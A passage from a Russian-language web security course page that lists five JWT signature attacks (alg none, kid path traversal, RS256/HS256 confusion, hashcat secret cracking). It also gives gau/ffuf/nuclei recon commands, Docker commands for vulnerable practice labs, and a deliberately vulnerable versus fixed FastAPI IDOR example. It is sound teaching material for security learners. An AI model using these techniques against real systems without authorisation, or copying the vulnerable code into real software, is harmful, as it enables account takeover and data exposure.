          <li><strong>Unverified Signature:</strong> сервер читает <code class="inline-code">jwt.decode()</code> вместо <code class="inline-code">jwt.verify()</code> — просто меняем <code class="inline-code">"role":"admin"</code>!</li>
          <li><strong>Алгоритм <code class="inline-code">alg: "none"</code>:</strong> меняем алгоритм в шапке на <code class="inline-code">"none"</code> и стираем подпись после второй точки.</li>
          <li><strong>Брутфорс слабого секрета:</strong> <code class="inline-code">hashcat -a 0 -m 16500 jwt.txt rockyou.txt</code> — за секунды находит простой ключ (например, <code class="inline-code">secret1</code>) и позволяет самому подписывать любые токены!</li>
          <li><strong>Путаница <code class="inline-code">RS256 → HS256</code>:</strong> подписываем токен открытым публичным ключом сервера как симметричным паролем.</li>
          <li><strong>Инъекция в <code class="inline-code">kid</code>:</strong> передаём <code class="inline-code">"kid": "../../../../../dev/null"</code> и подписываем токен пустой строкой <code class="inline-code">""</code>.</li>
        </ol>
      </div>
    </div>

    <div class="diagram-card">
      <img src="../05-Assets/jwt_structure_and_attacks.svg" alt="Структура и атаки на JWT" onclick="openLightbox(this.src)">
      <div class="diagram-caption">Анатомия JWT-токена и 5 векторов атаки на подпись.</div>
    </div>

    <h2 class="section-heading">🚀 ГЛАВА 8 и 9. Автоматизация разведки (Recon Flow) и Уязвимые стенды в Docker</h2>
    <div class="diagram-card">
      <img src="../05-Assets/recon_automation_pipeline.svg" alt="Конвейер автоматизации разведки" onclick="openLightbox(this.src)">
      <div class="diagram-caption">Конвейер разведки (Recon Pipeline): subfinder → httpx → gau/waybackurls → ffuf → nuclei.</div>
    </div>

    <div class="grid-2">
      <div class="card">
        <div class="card-title">⚡ Боевые команды <code class="inline-code">gau</code>, <code class="inline-code">ffuf</code> и <code class="inline-code">nuclei</code></div>
        <div class="code-wrap">
          <div class="code-header"><span>Конвейер разведки и фаззинга (только на разрешённых целях!)</span><button class="copy-btn" onclick="copyCode(this)">Копировать</button></div>
          <pre class="code-block"># 1. Собрать архивные ссылки из Wayback Machine:
gau target.com | grep -Ei "admin|api|v1|debug|token|\.js$"

# 2. Сверхбыстрый поиск скрытых папок и файлов через ffuf:
ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,302,403 -fc 404

# 3. Поиск скрытых GET-параметров с фильтром по размеру ответа (-fs):
ffuf -u "https://target.com/api/item?FUZZ=1" -w params.txt -fs 420

# 4. Сканирование по базе шаблонов уязвимостей nuclei:
nuclei -u https://target.com -severity critical,high</pre>
        </div>
      </div>

      <div class="card">
        <div class="card-title">🐳 4 уязвимых полигона у тебя на ПК одной командой Docker</div>
        <div class="code-wrap">
          <div class="code-header"><span>Запуск локальных тренажёров в Docker</span><button class="copy-btn" onclick="copyCode(this)">Копировать</button></div>
          <pre class="code-block"># 1. OWASP Juice Shop (современный магазин: REST API, JSON, JWT, XSS, SQLi + ИИ-бот!):
docker run --rm -p 3000:3000 bkimminich/juice-shop
# -> Открой http://localhost:3000 (найди секретную страницу /score-board)

# 2. DVWA (классика с кнопкой View Source и 4 уровнями защиты Low..Impossible):
docker run --rm -it -p 8081:80 vulnerables/web-dvwa
# -> http://localhost:8081 (логин: admin / password)

# 3. bWAPP (100+ веб-багов):
docker run --rm -d -p 8082:80 raesene/bwapp

# 4. VAmPI (специальный стенд для взлома REST API, BOLA/IDOR, Mass Assignment и JWT):
docker run --rm -d -p 5000:5000 erev0s/vampi</pre>
        </div>
      </div>
    </div>

    <h2 class="section-heading">🛠️ ГЛАВА 10. Глазами разработчика: Уязвимый vs Защищённый код (Python FastAPI)</h2>
    <div class="code-wrap">
      <div class="code-header"><span>Как возникает и как лечится IDOR и Mass Assignment на сервере</span><button class="copy-btn" onclick="copyCode(this)">Копировать</button></div>
      <pre class="code-block"># ❌ УЯЗВИМЫЙ КОД НА БЭКЕНДЕ (IDOR — проверяет токен входа, но НЕ проверяет владельца документа!):
@app.get("/api/orders/{order_id}")
def get_order_vulnerable(order_id: int, current_user: User = Depends(get_current_user)):
    return db.query(Order).filter(Order.id == order_id).first()

# ✅ ЗАЩИЩЁННЫЙ КОД (Проверяем и ID заказа, и что его владелец — именно текущий пользователь!):
@app.get("/api/orders/{order_id}")
def get_order_safe(order_id: int, current_user: User = Depends(get_current_user)):
    order = db.query(Order).filter(Order.id == order_id, Order.owner_id == current_user.id).first()
    if not order:
        raise HTTPException(status_code=403, detail="Access Denied")
    return order</pre>
    </div>
  `
};
